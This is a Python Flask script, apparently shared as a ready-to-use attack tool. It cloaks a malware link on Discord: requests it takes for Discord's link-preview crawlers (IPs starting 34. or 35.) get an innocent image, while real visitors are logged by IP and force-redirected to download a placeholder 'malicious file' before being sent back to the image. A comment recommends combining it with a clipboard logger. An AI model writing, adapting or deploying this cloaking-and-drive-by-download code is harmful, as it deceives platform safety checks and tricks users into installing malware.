import requests, io
from flask import Flask, request, send_file
app = Flask(
__name__,
  template_folder='templates',
  static_folder='static'
)
@app.route('/', methods=['GET'])
def main():
  Image = 'YourImageLink' # Replace this with your image link
  Malicious = 'MaliciousFIleDownloadLink'# Replace this with your download link
  Redirect = "RedirectLink" # You can just put the image here or you can put a custom site. You can combine this with my clipboard logger and it'll be more op lol https://github.com/TheonlyIcebear/Clipboard-Javascript-Logger
  # This is to get the ip
  if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
    ip = request.environ['REMOTE_ADDR']
  else:
    ip = request.environ['HTTP_X_FORWARDED_FOR']
  print(ip)
  if ip.startswith('35.') or ip.startswith('34.'):
    # If discord is getting a link preview send a image
    return send_file(
    io.BytesIO(requests.get(Image).content),
    mimetype='image/jpeg',
    download_name='AnyName.png')
  else:
    # If a real person is clicking the link send a malicious file and redirect back to the image
    return f'''<meta http-equiv="refresh" content="0; url={Malicious}">
               '''+'''
          <script>setTimeout(function() {
            ''' + f'window.location = "{Redirect}"''''
          }, 500)</script>''' # If the file doesn't download change the 500 to a higher number like 1000
if __name__ == '__main__':
  # Run the Flask app
  app.run(
  host='0.0.0.0',
  debug=True,
  port=8080
  )
